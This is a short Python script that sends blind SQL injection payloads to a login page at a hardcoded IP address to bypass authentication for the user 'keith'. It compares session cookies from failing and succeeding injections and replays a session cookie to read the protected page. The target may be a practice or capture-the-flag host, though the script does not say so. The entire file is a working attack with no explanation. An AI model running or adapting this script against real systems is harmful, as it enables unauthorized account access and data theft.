import requests
from pprint import pprint

s = "\" or username='keith' and password like '%'  and \"\"=\""
d = "\" or username='keith' and password like 'gjfkdljg'  and \"\"=\""
d2 = "\" or username='keith' and password like 'ffkdsjhf'  and \"\"=\""
print(s)
params = {
	'username' : 'keith',
	'password': s
}
fail = requests.post('http://206.189.179.133/index.php', params=d)
fail2 = requests.post('http://206.189.179.133/index.php', params=d2)
success = requests.post('http://206.189.179.133/index.php', params=s)
print(fail.cookies)
print(fail2.cookies)
print(success.cookies)
cookies = {
	'PHPSESSID':success.text
}
test = requests.post('http://206.189.179.133/index.php',cookies=cookies)
print(test.text)